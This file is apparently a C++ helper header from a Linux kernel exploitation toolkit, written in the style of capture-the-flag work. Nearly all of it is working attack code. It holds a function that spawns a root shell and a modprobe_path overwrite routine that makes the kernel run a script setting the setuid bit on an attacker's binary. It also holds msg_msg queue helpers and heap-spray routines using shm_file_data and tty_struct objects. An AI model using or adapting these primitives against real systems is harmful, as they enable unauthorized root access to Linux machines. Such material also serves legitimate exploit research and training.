#ifndef __EXP_H__
#define __EXP_H__

// msg_msg
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>

// shm_file_data
#include <sys/ipc.h>
#include <sys/shm.h>

// tty_struct
// open
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

namespace pwn
{

    void win()
    {
        char *argv[] = {(char *)"/bin/sh", NULL};
        char *envp[] = {NULL};
        execve("/bin/sh", argv, envp);
    }

    namespace modprobe_path
    {
        void init(std::string modprobe_path, std::string dummy_file, std::string win_bin)
        {
            // todo: check if these path are all absolute path

            int fd = open(dummy_file.c_str(), O_RDWR | O_CREAT);
            if (fd < 0)
            {
                perror("[*] dummy_file creation failed");
                exit(-1);
            }

            char bad_magic[] = "\xff\xff\xff\xff";
            write(fd, bad_magic, sizeof(bad_magic) - 1); // remove null terminator
            close(fd);

            std::string w = "#!/bin/sh\nchmod 4755 " + win_bin + " && chown root:root " + win_bin + " && chmod u+s " + win_bin + "\n";

            if (chmod(dummy_file.c_str(), 0777) < 0)
            {
                logger::error("Failed to chmod dummy_file");
                exit(-1);
            };

            fd = open(modprobe_path.c_str(), O_RDWR | O_CREAT);
            if (fd < 0)
            {
                logger::error("modprobe_path creation failed");
            }

            write(fd, w.c_str(), w.size() + 1);
            close(fd);

            if (chmod(modprobe_path.c_str(), 0777) < 0)
            {
                logger::error("Failed to chmod modprobe_path");
            };
        }

        void trigger(std::string dummy_file, std::string win_bin)
        {
            logger::info("Triggering modprobe_path");
            system(dummy_file.c_str());

            logger::info("Triggering win");
            system(win_bin.c_str());
        }
    }

    namespace msg_msg
    {
        // msg_msg structs
        typedef struct
        {
            long mtype;
            char mtext[1];
        } msg;

        typedef struct
        {
            void *ll_next;
            void *ll_prev;
            long m_type;
            size_t m_ts;
            void *next;
            void *security;
        } msg_header;

        int32_t make_queue(key_t key, int msgflg)
        {
            int32_t result;
            if ((result = msgget(key, msgflg)) == -1)
            {
                perror("msgget failure");
                exit(-1);
            }
            return result;
        }
        void get_msg(int msqid, void *msgp, size_t msgsz, long msgtyp, int msgflg)
        {
            if (msgrcv(msqid, msgp, msgsz, msgtyp, msgflg) < 0)
            {
                perror("msgrcv");
                exit(-1);
            }
            return;
        }

        void send_msg(int msqid, void *msgp, size_t msgsz, int msgflg)
        {
            if (msgsnd(msqid, msgp, msgsz, msgflg) == -1)
            {
                perror("msgsend failure");
                exit(-1);
            }
            return;
        }
    }

    namespace kmalloc_32
    {
        namespace shm_file_data
        {
            void spray(size_t num_of_spray)
            {
                // spray shmem structures
                int shmid;
                void *shmaddr;
                for (int i = 0; i < num_of_spray; i++)
                {
                    if ((shmid = shmget(IPC_PRIVATE, 100, 0600)) == -1)
                    {
                        perror("shmget error");
                        exit(-1);
                    }
                    shmaddr = shmat(shmid, NULL, 0);
                    if (shmaddr == (void *)-1)
                    {
                        perror("shmat error");
                        exit(-1);
                    }
                }
            }
        }
    }

    namespace kmalloc_1024
    {
        namespace tty_struct
        {
            std::vector<int> spray(size_t num_of_spray)
            {
                std::vector<int> sprays;
                for (int i = 0; i < num_of_spray; i++)
                {
                    int cur_fd = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
                    if (cur_fd == -1)
                    {
                        perror("tty_struct ptmx error");
                        exit(-1);
                    }
                    else
                    {
                        sprays.push_back(cur_fd);
                    }
                }

                return sprays;
            }
        }
    }
}
#endif